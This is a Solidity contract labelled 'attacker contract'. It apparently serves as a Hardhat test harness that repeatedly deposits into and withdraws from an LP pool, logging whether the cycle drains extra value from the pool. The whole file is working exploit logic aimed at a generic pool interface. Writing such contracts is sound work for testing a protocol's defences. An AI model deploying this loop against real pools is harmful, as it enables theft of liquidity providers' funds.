// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

import "hardhat/console.sol";


interface IPool {
    function totalValue() external view returns(uint);
    function riskAssetValue() external view returns(uint);
    function stableAssetValue() external view returns(uint);
    
    function deposit(uint amount) external;
    function withdrawLP(uint amount) external;
}

contract AttackLP1 {

    IPool public pool;
    IERC20Metadata public lpToken;
    IERC20Metadata public depositToken;
    IERC20Metadata public investToken;


    constructor(
        address _poolAddress,
        address _poolLpAddress,
        address _depositTokenAddress,
        address _investTokenAddress
    ) {
        pool = IPool(_poolAddress);
        lpToken = IERC20Metadata(_poolLpAddress);
        depositToken = IERC20Metadata(_depositTokenAddress);
        investToken = IERC20Metadata(_investTokenAddress);
    }


    function description() public pure returns(string memory) {
        return "attacker contract";
    }


    function start(uint initialBalance, uint iterations) public {

        uint amount = initialBalance;
        require (depositToken.allowance(msg.sender,  address(this)) >= amount, "Unsufficient allowance!");
        depositToken.transferFrom(address(msg.sender), address(this), amount);
      

        for (uint i = 0; i<iterations; i++) {
        
            // console.log("A: >> INIT pool amount: ",  depositToken.balanceOf(address(pool)), investToken.balanceOf(address(pool)) );  // 0.290524999992204 %
            // console.log("A: >> INIT pool val: ", pool.stableAssetValue(), pool.riskAssetValue(), pool.totalValue());  // 0.290524999992204 %

            depositToken.approve((address(pool)), amount);
            pool.deposit(amount);
            console.log("A: >> Deposited ", amount, depositToken.balanceOf(address(this)));


            uint lpBalance = lpToken.balanceOf(address(this));
            uint supply = lpToken.totalSupply();
            console.log("A: >> LP: ", lpBalance, "supply: ", supply);
            console.log("A: >> LP PERC: ",  10000 * lpBalance / supply); 

            //  before withrawal
            // console.log("A: >> pool 1 amount: ",  depositToken.balanceOf(address(pool)), investToken.balanceOf(address(pool)) );  // 0.290524999992204 %
            // console.log("A: >> pool 1 val: ", pool.stableAssetValue(), pool.riskAssetValue() );  // 0.290524999992204 %

            pool.withdrawLP(lpBalance);

            //  after withrawal
            // console.log("A: >> pool 2 amount: ",  depositToken.balanceOf(address(pool)), investToken.balanceOf(address(pool)) );  // 0.290524999992204 %
            // console.log("A: >> pool 2 val: ", pool.stableAssetValue(), pool.riskAssetValue() );  // 0.290524999992204 %

            console.log("A: >> Withdrawn: ", depositToken.balanceOf(address(this)));

            // uint leftover = depositToken.balanceOf(address(this)) - amount;

            amount = depositToken.balanceOf(address(this)) < initialBalance ? depositToken.balanceOf(address(this)) : initialBalance;
        }

        // return inital deposit or what is left of it
        depositToken.transfer(msg.sender, amount);

        if ( depositToken.balanceOf(address(this)) == 0) {
            console.log("A: >>  NO GAINS MADE. Lost: ", initialBalance - amount);
        } else {
            console.log("A: >> TOTAL GAINS: ", depositToken.balanceOf(address(this)));
        }
   
    }

    function balance() external view returns (uint) {
        return depositToken.balanceOf(address(this));
    }

}